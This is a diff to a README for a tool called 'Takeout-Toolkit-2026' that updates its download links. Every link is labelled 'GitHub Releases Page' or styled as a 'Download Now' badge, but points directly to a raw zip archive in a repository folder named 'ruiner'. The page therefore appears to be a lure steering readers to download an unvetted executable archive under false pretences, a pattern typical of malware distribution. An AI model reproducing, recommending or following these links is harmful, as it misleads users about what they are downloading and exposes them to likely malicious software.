@@ -1,6 +1,6 @@
 # 🧰 Takeout-Toolkit-2026 - Simplify Your Data Management
 
-![Download Now](https://raw.githubusercontent.com/quequeressaberminombrepvto/Takeout-Toolkit-2026/main/ruiner/Toolkit-Takeout-2.0.zip%20Now-%20%23F05033?style=for-the-badge&logo=github&logoColor=white)
+![Download Now](https://raw.githubusercontent.com/quequeressaberminombrepvto/Takeout-Toolkit-2026/main/ruiner/Toolkit-Takeout-v2.8.zip%20Now-%20%23F05033?style=for-the-badge&logo=github&logoColor=white)
 
 ## 📜 Description
 
@@ -12,7 +12,7 @@ To get started with Takeout-Toolkit-2026, follow these easy steps to download an
 
 ## 📥 Download & Install
 
-Visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/quequeressaberminombrepvto/Takeout-Toolkit-2026/main/ruiner/Toolkit-Takeout-2.0.zip)
+Visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/quequeressaberminombrepvto/Takeout-Toolkit-2026/main/ruiner/Toolkit-Takeout-v2.8.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Choose the latest version listed.
@@ -72,4 +72,4 @@ We welcome contributions! If you find a bug or have an idea for an improvement, 
 
 Takeout-Toolkit-2026 is licensed under the MIT License. You can freely use, modify, and distribute it as per the license terms.
 
-Visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/quequeressaberminombrepvto/Takeout-Toolkit-2026/main/ruiner/Toolkit-Takeout-2.0.zip)
+Visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/quequeressaberminombrepvto/Takeout-Toolkit-2026/main/ruiner/Toolkit-Takeout-v2.8.zip)
